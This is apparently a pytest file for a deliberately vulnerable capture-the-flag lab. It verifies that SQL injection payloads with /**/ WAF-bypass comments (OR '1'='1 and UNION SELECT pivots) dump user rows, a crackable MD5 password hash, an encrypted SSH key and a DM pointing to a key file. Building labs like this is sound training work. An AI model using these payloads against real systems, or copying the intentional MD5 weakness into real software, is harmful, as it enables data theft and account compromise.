"""
SQLi checks — chain step 3.

Verifies the SQL injection vulnerability on /api/v1/users and all the data it
exposes across the two injection techniques:

  OR injection   →  dumps both user rows; svc_admin has encrypted_ssh_key blob;
                    j.harris has md5_hash set and bcrypt_hash null.
  UNION injection →  pivots to staff_messages table; returns k.chen's DM body.

Also verifies:
  - The MD5 hash stored for j.harris matches md5("ranger") — confirming the
    password is crackable and the login will work.
  - The svc_admin encrypted_ssh_key is a non-empty base64 string (chain decrypt
    precondition — actual openssl decryption is not exercised in tests).

This file replaces/extends the existing test_sqli.py.  Existing tests are kept
intact; new tests are added below them.
"""
import base64
import hashlib
import json
import pytest

# ---------------------------------------------------------------------------
# CONFIG — payloads and expected values
# ---------------------------------------------------------------------------
CONFIG = {
    # Normal (non-injected) lookups
    "svc_admin": "svc_admin",
    "harris": "j.harris",
    "nonexistent": "nobody_here",

    # OR injection payload (no spaces — WAF bypass with /**/)
    "or_payload": "'/**/OR/**/'1'='1",

    # UNION injection payload (no spaces — WAF bypass with /**/)
    # Pivots to staff_messages; column order matches users table schema:
    #   id, username(sender+recipient), role(sent_at), bcrypt_hash(subject),
    #   encrypted_ssh_key(body), md5_hash
    "union_payload": (
        "'/**/UNION/**/SELECT/**/id,username,role,bcrypt_hash,"
        "encrypted_ssh_key,md5_hash/**/FROM/**/staff_messages--"
    ),

    # Simpler UNION payload that the _simulate_query function actually checks for
    "union_simple_payload": (
        "'/**/UNION/**/SELECT/**/*/**/FROM/**/staff_messages--"
    ),

    # String that must appear in k.chen's DM body
    "kchen_dm_snippet": b"AES-256-CBC",
    "kchen_dm_passphrase_hint": b"/var/cerodias/deploy.key",

    # The crackable password for j.harris
    "harris_password": "ranger",
}

BASE_URL = "/api/v1/users"


def _get(client, payload):
    """Perform a GET to /api/v1/users with the given q= payload."""
    resp = client.get(f"{BASE_URL}?q={payload}")
    return resp, json.loads(resp.data)


class TestApiUsersBasic:
    """Baseline endpoint behaviour — these mirror tests in test_sqli.py."""

    def test_endpoint_exists(self, client):
        resp, _ = _get(client, CONFIG["svc_admin"])
        assert resp.status_code == 200

    def test_returns_json(self, client):
        _, data = _get(client, CONFIG["svc_admin"])
        assert "results" in data

    def test_normal_lookup_returns_one_row(self, client):
        _, data = _get(client, CONFIG["svc_admin"])
        assert len(data["results"]) == 1
        assert data["results"][0]["username"] == CONFIG["svc_admin"]

    def test_unknown_username_returns_empty(self, client):
        _, data = _get(client, CONFIG["nonexistent"])
        assert data["results"] == []

    def test_missing_parameter_returns_400(self, client):
        resp = client.get(BASE_URL)
        assert resp.status_code == 400

    def test_waf_blocks_literal_spaces(self, client):
        resp = client.get(f"{BASE_URL}?q=svc_admin hello")
        assert resp.status_code == 400

    def test_query_echoed_in_response(self, client):
        _, data = _get(client, CONFIG["svc_admin"])
        assert "query" in data
        assert CONFIG["svc_admin"] in data["query"]


class TestSvcAdminRow:
    """svc_admin row contains the encrypted SSH key blob — chain decrypt precondition."""

    def test_svc_admin_row_has_encrypted_ssh_key(self, client):
        """
        svc_admin's encrypted_ssh_key is non-null.
        If this fails, _seed_ssh_key did not run at startup (openssl or cryptography
        package may be missing).
        """
        _, data = _get(client, CONFIG["svc_admin"])
        row = data["results"][0]
        assert row.get("encrypted_ssh_key") is not None, (
            "svc_admin encrypted_ssh_key is null — SSH key seeding failed at startup"
        )

    def test_svc_admin_encrypted_ssh_key_is_base64(self, client):
        """encrypted_ssh_key is a valid base64 string — can be piped to openssl."""
        _, data = _get(client, CONFIG["svc_admin"])
        blob = data["results"][0]["encrypted_ssh_key"]
        # Should not raise — valid base64 with padding tolerance
        decoded = base64.b64decode(blob + "==")
        assert len(decoded) > 0

    def test_svc_admin_has_no_md5_hash(self, client):
        """svc_admin md5_hash is null — only j.harris has the legacy hash."""
        _, data = _get(client, CONFIG["svc_admin"])
        row = data["results"][0]
        assert row.get("md5_hash") is None

    def test_svc_admin_role_is_admin(self, client):
        _, data = _get(client, CONFIG["svc_admin"])
        assert data["results"][0]["role"] == "admin"


class TestOrInjection:
    """OR injection dumps all users — both svc_admin and j.harris are returned."""

    def test_or_injection_returns_multiple_rows(self, client):
        """OR '1'='1 returns more than one row — injection confirmed."""
        _, data = _get(client, CONFIG["or_payload"])
        assert len(data["results"]) > 1, (
            f"OR injection payload {CONFIG['or_payload']!r} returned <= 1 row"
        )

    def test_or_injection_returns_svc_admin(self, client):
        """svc_admin is present in the dumped rows."""
        _, data = _get(client, CONFIG["or_payload"])
        usernames = [r["username"] for r in data["results"]]
        assert CONFIG["svc_admin"] in usernames

    def test_or_injection_returns_harris(self, client):
        """j.harris is present in the dumped rows."""
        _, data = _get(client, CONFIG["or_payload"])
        usernames = [r["username"] for r in data["results"]]
        assert CONFIG["harris"] in usernames

    def test_harris_row_has_md5_hash(self, client):
        """j.harris row has md5_hash set — legacy credential, crackable with rockyou."""
        _, data = _get(client, CONFIG["or_payload"])
        harris = next(r for r in data["results"] if r["username"] == CONFIG["harris"])
        assert harris.get("md5_hash") is not None, (
            "j.harris md5_hash is null — check _build_user_table in memory_store.py"
        )

    def test_harris_row_has_no_bcrypt_hash(self, client):
        """j.harris bcrypt_hash is null — migration to bcrypt is intentionally incomplete."""
        _, data = _get(client, CONFIG["or_payload"])
        harris = next(r for r in data["results"] if r["username"] == CONFIG["harris"])
        assert harris.get("bcrypt_hash") is None

    def test_harris_md5_matches_ranger(self, client):
        """
        j.harris md5_hash == md5('ranger').

        This is the key crack-and-login step: a player who dumps this hash and
        runs it against rockyou.txt will recover the password instantly.
        """
        _, data = _get(client, CONFIG["or_payload"])
        harris = next(r for r in data["results"] if r["username"] == CONFIG["harris"])
        expected = hashlib.md5(CONFIG["harris_password"].encode()).hexdigest()
        assert harris["md5_hash"] == expected, (
            f"j.harris md5_hash {harris['md5_hash']!r} does not match "
            f"md5({CONFIG['harris_password']!r}) = {expected!r}"
        )


class TestUnionInjection:
    """
    UNION injection pivots to the staff_messages table.

    The _simulate_query function matches any payload containing both 'union'
    and 'staff_messages' (case-insensitive).  The resulting rows are formatted
    with the message body mapped to the encrypted_ssh_key column so the DM
    content is visible in the standard results schema.
    """

    def _union_payload(self):
        """Return the UNION payload that _simulate_query recognises."""
        # The simulate function keys on 'union' + 'staff_messages' in the query
        return "'/**/UNION/**/SELECT/**/*/**/FROM/**/staff_messages--"

    def test_union_payload_returns_results(self, client):
        """UNION payload targeting staff_messages returns at least one row."""
        _, data = _get(client, self._union_payload())
        assert len(data["results"]) >= 1, (
            "UNION injection returned no rows — check _simulate_query logic"
        )

    def test_union_results_contain_kchen_dm_body(self, client):
        """
        The injected rows include k.chen's DM body mapped to encrypted_ssh_key.
        The body confirms the encryption method (AES-256-CBC) and passphrase location.
        """
        _, data = _get(client, self._union_payload())
        # The body appears in the encrypted_ssh_key field of injected rows
        all_text = json.dumps(data).encode()
        assert CONFIG["kchen_dm_snippet"] in all_text, (
            "AES-256-CBC not found in UNION injection results — k.chen DM missing"
        )

    def test_union_results_reveal_passphrase_path(self, client):
        """
        k.chen's DM names /var/cerodias/deploy.key — the RCE read target.
        Players now know which file to cat with their webshell.
        """
        _, data = _get(client, self._union_payload())
        all_text = json.dumps(data).encode()
        assert CONFIG["kchen_dm_passphrase_hint"] in all_text, (
            "/var/cerodias/deploy.key not found in UNION injection results"
        )

    def test_union_message_rows_show_sender_recipient(self, client):
        """
        UNION rows format the sender/recipient in the username field.
        Players can identify that these are staff messages, not user accounts.
        """
        _, data = _get(client, self._union_payload())
        # At least one injected row username contains 'msg from:'
        injected = [r for r in data["results"] if "msg from:" in r.get("username", "")]
        assert len(injected) >= 1, (
            "No injected message rows found — username field should contain 'msg from:'"
        )
